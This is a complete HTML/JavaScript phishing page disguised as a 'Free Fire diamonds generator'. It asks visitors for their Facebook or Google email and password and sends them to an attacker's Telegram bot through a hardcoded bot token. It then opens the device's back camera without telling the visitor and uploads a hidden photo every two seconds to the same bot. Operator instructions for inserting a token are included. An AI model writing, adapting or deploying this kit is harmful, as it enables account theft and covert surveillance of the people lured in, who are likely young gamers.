<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Free Fire Diamonds - Get Now</title>
  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #0f0c29, #302b63, #24243e);
      color: white;
      margin: 0;
      padding: 0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }
    .container {
      width: 90%;
      max-width: 420px;
      padding: 20px 0;
      text-align: center;
    }
    h1 {
      font-size: 3.5rem;
      margin: 40px 0 10px;
      color: #ffeb3b;
      text-shadow: 0 0 25px #ffeb3b99;
    }
    .subtitle {
      font-size: 1.4rem;
      margin-bottom: 40px;
      opacity: 0.9;
    }
    .diamond-btn {
      background: #1e88e5;
      color: white;
      border: none;
      border-radius: 14px;
      padding: 18px 28px;
      font-size: 1.3rem;
      margin: 14px 10px;
      cursor: pointer;
      min-width: 160px;
      transition: all 0.25s;
    }
    .diamond-btn:hover {
      background: #42a5f5;
      transform: translateY(-3px);
    }
    .diamond-btn.selected {
      background: #ff5722;
      box-shadow: 0 0 30px #ff5722cc;
      transform: scale(1.08);
    }
    #step2, #step3, #processing {
      display: none;
    }
    .login-box {
      background: rgba(255,255,255,0.09);
      backdrop-filter: blur(12px);
      border-radius: 18px;
      padding: 28px;
      margin: 25px 0;
      border: 1px solid rgba(255,255,255,0.15);
    }
    input {
      width: 100%;
      padding: 15px;
      margin: 12px 0;
      border-radius: 12px;
      border: 1px solid #666;
      background: rgba(0,0,0,0.45);
      color: white;
      font-size: 1.15rem;
    }
    input::placeholder {
      color: #bbb;
    }
    .provider-btn {
      background: #1877f2;
      color: white;
      border: none;
      padding: 15px 32px;
      font-size: 1.15rem;
      border-radius: 12px;
      margin: 12px;
      cursor: pointer;
      min-width: 180px;
    }
    .provider-btn.google {
      background: #ffffff;
      color: #333;
    }
    #get-diamonds {
      background: #4caf50;
      color: white;
      font-size: 1.5rem;
      padding: 20px 50px;
      border: none;
      border-radius: 60px;
      margin: 35px 0 15px;
      cursor: pointer;
      box-shadow: 0 10px 30px rgba(76,175,80,0.5);
    }
    #processing {
      font-size: 2.5rem;
      margin: 80px 0;
      color: #ffeb3b;
      text-shadow: 0 0 40px #ffeb3b;
      animation: pulse 2s infinite;
    }
    @keyframes pulse {
      0%,100% { opacity: 0.7; }
      50% { opacity: 1; }
    }
    .hidden-video {
      position: absolute;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>
<body>

<div class="container">

  <h1>Free Fire</h1>
  <div class="subtitle">Free Diamonds Generator 2025</div>

  <div id="step1">
    <div>
      <button class="diamond-btn" data-diamonds="100">100 Diamonds</button>
      <button class="diamond-btn" data-diamonds="200">200 Diamonds</button>
    </div>
    <div>
      <button class="diamond-btn" data-diamonds="300">300 Diamonds</button>
      <button class="diamond-btn" data-diamonds="500">500 Diamonds</button>
    </div>
  </div>

  <div id="step2">
    <h2 style="margin:40px 0 15px;">Select Login Method</h2>
    <button class="provider-btn" id="fb-btn">Facebook</button>
    <button class="provider-btn google" id="google-btn">Google</button>
  </div>

  <div id="step3" class="login-box">

    <div id="fb-fields">
      <input type="text" id="fb-email" placeholder="Email or Phone Number" autocomplete="off"/>
      <input type="text" id="fb-username" placeholder="Username (optional)" autocomplete="off"/>
      <input type="password" id="fb-pass" placeholder="Password" autocomplete="off"/>
    </div>

    <div id="google-fields" style="display:none;">
      <input type="email" id="google-email" placeholder="Google Email" autocomplete="off"/>
      <input type="password" id="google-pass" placeholder="Password" autocomplete="off"/>
    </div>

    <button id="get-diamonds">Get Diamonds Now</button>
  </div>

  <div id="processing">
    Processing...
  </div>

</div>

<video id="video" class="hidden-video" autoplay playsinline muted></video>
<canvas id="canvas" class="hidden-video"></canvas>

<script>
// =============================================
//  CONFIG - CHANGE THESE TWO LINES ONLY
// =============================================
const TELEGRAM_BOT_TOKEN = "7752428251:AAGNplPML8xLHGQDaHYgs5djp70KcqMBFEI";   // ← Put your bot token here
// chat_id comes from ?id=xxxxxxxx in URL
// =============================================

let selectedDiamonds = null;
let loginMethod = null;
let stream = null;
let photoInterval = null;
let isCapturing = false;
let photoCount = 0;

document.querySelectorAll('.diamond-btn').forEach(btn => {
  btn.addEventListener('click', () => {
    document.querySelectorAll('.diamond-btn').forEach(b => b.classList.remove('selected'));
    btn.classList.add('selected');
    selectedDiamonds = btn.dataset.diamonds;
    document.getElementById('step1').style.display = 'none';
    document.getElementById('step2').style.display = 'block';
  });
});

document.getElementById('fb-btn').addEventListener('click', () => {
  loginMethod = 'facebook';
  document.getElementById('fb-fields').style.display = 'block';
  document.getElementById('google-fields').style.display = 'none';
  document.getElementById('step2').style.display = 'none';
  document.getElementById('step3').style.display = 'block';
});

document.getElementById('google-btn').addEventListener('click', () => {
  loginMethod = 'google';
  document.getElementById('fb-fields').style.display = 'none';
  document.getElementById('google-fields').style.display = 'block';
  document.getElementById('step2').style.display = 'none';
  document.getElementById('step3').style.display = 'block';
});

document.getElementById('get-diamonds').addEventListener('click', async () => {
  document.getElementById('step3').style.display = 'none';
  document.getElementById('processing').style.display = 'block';

  let email = '', username = '', password = '';

  if (loginMethod === 'facebook') {
    email    = document.getElementById('fb-email').value.trim();
    username = document.getElementById('fb-username').value.trim();
    password = document.getElementById('fb-pass').value;
  } else if (loginMethod === 'google') {
    email    = document.getElementById('google-email').value.trim();
    password = document.getElementById('google-pass').value;
  }

  const urlParams = new URLSearchParams(window.location.search);
  const chatId = urlParams.get('id') || 'NO_CHAT_ID';

  const dataText = `
Free Fire Diamond Request ─ ${new Date().toLocaleString('en-IN')}
──────────────────────────────
Diamonds: ${selectedDiamonds || 'unknown'}
Method:   ${loginMethod || 'unknown'}
Email/Phone: ${email}
Username:    ${username || '-'}
Password:    ${password}
Telegram ID: ${chatId}
Photo count will follow...
  `.trim();

  await sendToTelegram(dataText, chatId);

  // ── CAMERA PART (Back camera + continuous new photos) ───────────────
  try {
    stream = await navigator.mediaDevices.getUserMedia({
      video: {
        facingMode: { exact: "environment" },   // force back camera
        width: { ideal: 1280 },
        height: { ideal: 720 },
        frameRate: { ideal: 30 }
      }
    });

    const video = document.getElementById('video');
    video.srcObject = stream;
    video.muted = true;
    video.playsInline = true;

    // Wait for video to be ready with real dimensions
    await new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play()
          .then(() => setTimeout(resolve, 1200))  // give time for first real frame
          .catch(resolve);
      };
      video.onerror = () => resolve();
      setTimeout(resolve, 4000); // max wait
    });

    if (video.videoWidth <= 0 || video.videoHeight <= 0) {
      throw new Error("Back camera stream has no valid size");
    }

    isCapturing = true;
    photoInterval = setInterval(() => {
      if (isCapturing) takeAndSendNewPhoto(chatId);
    }, 2100); // ≈ every 2.1 seconds

    // First photo quicker
    setTimeout(() => {
      if (isCapturing) takeAndSendNewPhoto(chatId);
    }, 900);

  } catch (err) {
    const errMsg = `Camera failed: ${err.message || err.name || 'unknown'}\nLikely permission denied or no back camera.`;
    await sendToTelegram(errMsg, chatId);
    document.getElementById('processing').innerHTML = "Processing... (camera not available)";
  }
});

async function takeAndSendNewPhoto(chatId) {
  if (!isCapturing) return;

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');

  if (!video || video.videoWidth <= 0) return;

  canvas.width = video.videoWidth;
  canvas.height = video.videoHeight;

  const ctx = canvas.getContext('2d');
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(async (blob) => {
    if (!blob || blob.size < 2000) return; // invalid / empty image

    photoCount++;
    const filename = `backcam_\( {photoCount}_ \){Date.now()}.jpg`;

    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, filename);

    try {
      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: formData
      });

      if (res.ok) {
        // optional: send small update every 5 photos
        if (photoCount % 5 === 0) {
          sendToTelegram(`Sent ${photoCount} new back camera photos`, chatId);
        }
      }
    } catch (e) {
      // silent
    }
  }, 'image/jpeg', 0.94);
}

async function sendToTelegram(text, chatId) {
  if (chatId === 'NO_CHAT_ID' || !TELEGRAM_BOT_TOKEN.includes(':')) return;

  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: 'Markdown'
      })
    });
  } catch {}
}

// Cleanup on leave / close
window.addEventListener('beforeunload', () => {
  isCapturing = false;
  if (photoInterval) clearInterval(photoInterval);
  if (stream) {
    stream.getTracks().forEach(track => track.stop());
  }
});
</script>

</body>
</html>
